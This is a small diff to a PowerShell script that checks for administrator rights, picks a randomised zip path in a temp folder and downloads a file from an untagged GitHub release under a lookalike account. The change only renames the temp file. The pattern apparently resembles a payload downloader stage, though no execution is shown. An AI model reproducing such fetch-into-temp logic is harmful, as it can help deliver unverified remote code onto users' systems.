@@ -9,7 +9,7 @@ $DownloadURL2 = 'https://github.com/tri72027/3X-UI/releases/download/untagged-36
 
 $rand = Get-Random -Maximum 99999999
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
-$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\release_$rand.zip" } else { "$env:TEMP\release_$rand.zip" }
+$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\long_$rand.zip" } else { "$env:TEMP\long_$rand.zip" }
 
 try {
     Invoke-WebRequest -Uri $DownloadURL -OutFile $FilePath -UseBasicParsing
